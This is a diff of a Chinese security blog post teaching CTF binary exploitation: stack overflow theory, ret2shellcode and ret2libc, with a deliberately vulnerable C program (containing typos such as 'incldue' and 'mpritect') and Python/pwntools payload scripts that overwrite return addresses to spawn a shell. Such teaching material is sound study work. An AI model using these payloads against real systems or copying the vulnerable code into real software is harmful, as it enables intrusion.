@@ -10,7 +10,7 @@
 <meta property='og:description' content="二进制漏洞与利用，栈">
 <meta property='og:url' content='https://expl0rer.top/p/pwn-2/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-25T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-26T08:46:15&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/pwn-2/PWN2.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-25T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-27T02:14:29&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/pwn-2/PWN2.png' />
 <meta name="twitter:title" content="PWN-2">
 <meta name="twitter:description" content="二进制漏洞与利用，栈"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/pwn-2/PWN2.png' />
@@ -718,8 +718,21 @@ unicode: "ece7"
     <li><a href="#栈溢出原理">栈溢出原理</a>
       <ol>
         <li><a href="#栈溢出">栈溢出</a></li>
+        <li><a href="#栈溢出在ctf中的应用">栈溢出在CTF中的应用</a></li>
       </ol>
     </li>
+    <li><a href="#基本栈溢出">基本栈溢出</a>
+      <ol>
+        <li><a href="#栈溢出案例ret2shellcode">栈溢出案例：ret2shellcode</a>
+          <ol>
+            <li><a href="#方法一生成payload脚本劫持">方法一：生成payload脚本劫持</a></li>
+            <li><a href="#方法二利用栈溢出跳转到shellcode">方法二：利用栈溢出跳转到shellcode</a></li>
+          </ol>
+        </li>
+        <li><a href="#ret2libc">ret2libc</a></li>
+      </ol>
+    </li>
+    <li><a href="#rop">ROP</a></li>
   </ol>
 </nav>
         </div>
@@ -902,7 +915,208 @@ unicode: "ece7"
 <p>输入200长度造成栈溢出，超出的 120 字节会向上覆盖栈中更高地址的内容如ret（因为栈向下生长，越界写会向高地址蔓延）。</p>
 <p><strong>覆盖返回地址可以控制程序下一步执行的位置，而通过控制执行位置，攻击者可以间接实现 “修改任意地址” 的效果</strong>。</p>
 <p>举例，攻击者构造输入：前 84 字节填充无关数据（覆盖buf和func_b()的 ebp），第 85~88 字节填入0x12345678（小端序可能需要反写为0x78563412）；这时返回地址被覆盖成0x12345678，直接跳转到0x12345678（可能是攻击者的代码）。</p>
-
+<p>那说起返回地址这一块，回忆一下：</p>
+<blockquote>
+<p>调用函数：只需要将rip压栈，即push rip，然后讲rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。</p>
+<p>被调用函数：push rbp；mov rbp rsp; sub rsp oxxxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时rbp就
+变成了被调用函数的栈底。</p>
+<p>函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧，返回调用函数的返回地址。</p></blockquote>
+<p>栈溢出的核心是<strong>覆盖程序中 “会被用来决定下一步执行位置” 的数据</strong>，这些数据未必是<code>ret</code>指令读取的 “返回地址”。如果栈中存在被<code>jmp</code>、<code>call</code>等指令使用的 “目标地址”（比如函数指针、跳转表项等），覆盖这些地址同样能实现<strong>控制流劫持</strong>。</p>
+<p>具体来说：<code>ret</code>、<code>jmp</code>、<code>call</code>的共性与差异：</p>
+<ul>
+<li><strong><code>ret</code>指令</strong>：从栈中读取 “返回地址” 并跳转（依赖栈中存储的地址）</li>
+<li><strong><code>call 地址</code>指令</strong>：将当前指令的下一条地址压栈，然后跳转到 “地址”（若 “地址” 存储在栈中且可被覆盖，则<code>call</code>的目标会被篡改）</li>
+<li><strong><code>jmp 地址</code>指令</strong>：直接跳转到 “地址”（若 “地址” 存储在栈中且可被覆盖，则<code>jmp</code>的目标会被篡改）</li>
+</ul>
+<p>只要这些指令依赖的 “目标地址” 存储在栈中，且能被栈溢出覆盖，就能劫持控制流。<code>ret</code>只是最常见的场景（因为函数调用的返回地址几乎必然在栈上），而<code>jmp</code>/<code>call</code>的目标若在栈上，同样可以被利用。</p>
+<p>总之：栈溢出的原理就是栈中存储的局部变量数组发生溢出，覆盖了栈中的其他数据。将返回地址覆盖为我们期望的目标地址，即可劫持控制流。</p>
+<h3 id="栈溢出在ctf中的应用">栈溢出在CTF中的应用
+</h3><p>一般来说，在CTF中的PWN，多数情况下我们需要让程序执行这一段代码：
+<strong><code>system(&quot;/bin/sh&quot;)</code></strong></p>
+<p>也就是说在远程机器上开一个命令行终端，这样我们就可以通过命令行来控制目标机器。</p>
+<p>通常来说，CTF比赛中只需要开启命令行后读flag(cat flag）。</p>
+<h2 id="基本栈溢出">基本栈溢出
+</h2><p>如果程序中没有system这样的代码出现，怎么办？我们可以自己写shellcode！</p>
+<p>**<code>shellcode</code>**就是一段可以独立开启shell的一段汇编代码。</p>
+<p>ret2shellcode的思路就是：</p>
+<p>如果程序中存在让用户向一段长度足够的缓冲区中输入数据。我们向其中输入shellcode，将程序劫持到shellcode上即可。当然，这种也是理想情况。</p>
+<blockquote>
+<p><code>ret2shellcode</code>是二进制漏：洞利用中的一种常见技术，用于在存在栈溢出等漏洞的程序中获取系统的 shell 权限，从而执行任意命令。<code>ret2shellcode</code>利用这个特性，将返回地址覆盖为一段精心构造的机器码（即 shellcode）的地址，从而返回到攻击者留下的shellcode进行劫持。</p></blockquote>
+<h3 id="栈溢出案例ret2shellcode">栈溢出案例：ret2shellcode
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;stdlib.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;stdio.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#incldue &#34;unistd.h&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">global_buf</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">gen_shell</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">execv</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;wow&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vul</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;input:&#34;</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">200</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;done</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mpritect</span><span class="p">(</span><span class="mh">0x404000</span><span class="p">,</span><span class="mi">1000</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;gen_shell:0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">unsigned</span><span class="p">)</span><span class="o">&amp;</span><span class="n">gen_shell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;global_buf:0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">unsigned</span><span class="p">)</span><span class="o">&amp;</span><span class="n">global_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&#34;global:&#34;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">global_buf</span><span class="p">,</span><span class="mi">200</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">vul</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;goodbye!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>vul函数存在明显的栈溢出，可以劫持控制流到gen_shell函数、可以劫持控制流到global_buf。</p>
+<p>局部变量<code>buf[80]</code>仅分配 80 字节，但<code>read(0, buf, 200)</code>读取 200 字节输入，超出的 120 字节会覆盖栈中更高地址的数据（包括<code>ebp</code>和返回地址），属于典型的栈溢出漏洞。</p>
+<h4 id="方法一生成payload脚本劫持">方法一：生成payload脚本劫持
+</h4><p>vul()函数中，buf[80]是局部变量，栈布局从低到高为：buf[0..79] → ebp（4 字节，32 位系统） → 返回地址（4 字节）。</p>
+<p>覆盖返回地址需要先填充：80字节（buf） + 4字节（覆盖ebp），之后的 4 字节就是要写入的返回地址（即gen_shell的地址）。</p>
+<p>构造攻击数据（以 Python 为例）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 假设gen_shell地址为0x401120，小端序为b&#39;\x20\x11\x40\x00&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x20\x11\x40\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># 输出到程序输入</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输入攻击数据后，<code>vul()</code>函数执行<code>return</code>时，返回地址已被覆盖为<code>0x401120</code>，程序会跳转到<code>gen_shell</code>函数，执行<code>execv(&quot;/bin/sh&quot;, 0)</code>，成功获取 shell。</p>
+<h4 id="方法二利用栈溢出跳转到shellcode">方法二：利用栈溢出跳转到shellcode
+</h4><p>构造 payload 覆盖 <code>vul()</code> 函数的返回地址为 <code>global_buf</code> 的地址（即 shellcode 所在位置）&hellip;&hellip;</p>
+<h3 id="ret2libc">ret2libc
+</h3><p>有时候，我们需要调用一些系统函数，就比如说system或者execv等。程序中可能不会提供一些现成的函数。</p>
+<p>如果我们拿到了libc中函数的地址，我们可以直接调用libc中的函数，只需要传递好参数，然后call即可。</p>
+<p>如何传参？如何调用<code>system(/bin/sh)</code>？</p>
+<p>只需要将rdi设置为/bin/sh字符串地址，然后call system即可。</p>
+<p>如何设置mov？</p>
+<p>如果直接mov，然后call，那么就和ret2shellcode无异。</p>
+<p>现在问题是，我们只有一个libc地址和/bin/sh字符串地址，以及一个栈溢出漏洞，怎么传递参数？</p>
+<p>pop rdi ret + /bin/sh地址 + system</p>
+<p>来个例子：有一个存在栈溢出的 64 位程序 vuln</p>
+<ol>
+<li>
+<p>有一个漏洞函数 <code>vul()</code>，存在栈溢出（可覆盖返回地址）；</p>
+</li>
+<li>
+<p>程序加载了 libc 库（必然包含 <code>system</code> 函数）；</p>
+</li>
+<li>
+<p>我们通过信息泄露已经获取到：</p>
+<ul>
+<li><code>system</code> 函数在内存中的地址：<code>0x7ffff7839410</code></li>
+<li><code>&quot;/bin/sh&quot;</code> 字符串在内存中的地址：<code>0x7ffff79e5aaa</code></li>
+<li>一个 <code>pop rdi; ret</code> gadget 的地址：<code>0x401273</code>（从程序中找到）</li>
+</ul>
+</li>
+<li>
+<p>经调试，覆盖 <code>vul()</code> 函数返回地址需要先填充 <strong>120 字节</strong>（前 120 字节会覆盖局部变量和 <code>rbp</code>）。</p>
+<blockquote>
+<p>函数的<strong>第一个参数</strong>通过 <code>rdi</code> 寄存器传递。因此调用 <code>system(&quot;/bin/sh&quot;)</code> 必须满足：</p>
+<p><code>rdi</code> 寄存器中存放 <code>&quot;/bin/sh&quot;</code> 字符串的地址（<code>0x7ffff79e5aaa</code>）；</p>
+<p>程序跳转到 <code>system</code> 函数的地址（<code>0x7ffff7839410</code>）执行。</p></blockquote>
+</li>
+</ol>
+<p>通过栈溢出构造 payload，最终让程序执行 <code>system(&quot;/bin/sh&quot;)</code>，获取 shell。</p>
+<p>用 Python 代码生成 payload（pwntools）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 构造 payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>  <span class="c1"># 覆盖到返回地址的偏移量</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x401273</span>  <span class="c1"># pop rdi; ret gadget 地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="mh">0x7ffff79e5aaa</span>  <span class="c1"># &#34;/bin/sh&#34; 地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x7ffff7839410</span>  <span class="c1"># system 函数地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>                <span class="c1"># 填充偏移</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>           <span class="c1"># 放入 gadget 地址</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>           <span class="c1"># 放入参数地址（给 rdi）</span>
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>           <span class="c1"># 放入 system 地址（跳转执行）</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送 payload 到程序（假设通过管道连接）</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1"># 交互获取 shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>ret2libc</code> 调用 <code>system(&quot;/bin/sh&quot;)</code> 的核心逻辑是：</p>
+<p><strong>用 <code>pop rdi; ret</code> 把栈中的 <code>&quot;/bin/sh&quot;</code> 地址 “搬” 到 <code>rdi</code> 寄存器，再跳转到 <code>system</code> 函数</strong>。</p>
+<p>整个过程完全依赖栈溢出控制程序执行顺序，不需要程序中存在现成的 shell 函数，也不需要栈可执行，因此适用性极强。</p>
+<p>在这里开始就需要刷点PWN题了，我比较推荐的是ctfshow，购买官网套餐或者去咸鱼上买网盘保存的ctfshow-pwn题也行，看自己预算，在这里我就会同步进行writeup_pwn的编写了。</p>
+<h2 id="rop">ROP
+</h2>
 </section>
 
 
@@ -919,7 +1133,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-08-26
+            最后更新于 2025-08-27
         </span>
     </section></footer>
 
@@ -1005,6 +1219,30 @@ unicode: "ece7"
 
         <div class="article-details">
             <h2 class="article-title">PWN-1</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ctfshow-pwn-writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ctfshow-pwn-writeup/ctfshow.8c2a966268b078c807772be02e985309_hu_9b3814b0af84762b.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post ctfshow-pwn-writeup"
+                        
+                        data-hash="md5-jCqWYmiweMgHdyvgLphTCQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ctfshow-pwn-writeup</h2>
         </div>
     </a>
 </article>
@@ -1119,11 +1357,13 @@ unicode: "ece7"
 
 
 
+
+
         
 <section class="wordcount">
   <div class="wordcount-row">
-    <p>博主发布了6篇文章  ||</p>
-    <p>总共53.96k 字</p>
+    <p>博主发布了7篇文章  ||</p>
+    <p>总共56.79k 字</p>
   </div>
 </section>
         
